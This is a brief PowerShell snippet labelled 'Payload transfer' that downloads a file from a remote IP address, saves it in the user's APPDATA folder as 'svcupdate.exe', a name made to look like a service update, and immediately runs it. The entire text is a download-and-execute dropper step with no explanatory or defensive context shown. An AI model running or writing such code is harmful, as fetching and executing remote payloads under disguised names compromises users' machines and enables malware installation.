
# Payload transfer
$TargetUrl = "https://192.0.2.66/assets/update.dat"
$PayloadPath = "$env:APPDATA\svcupdate.exe"
Invoke-WebRequest -Uri $TargetUrl -OutFile $PayloadPath -UseBasicParsing
& $PayloadPath
Start-Sleep -Seconds 6
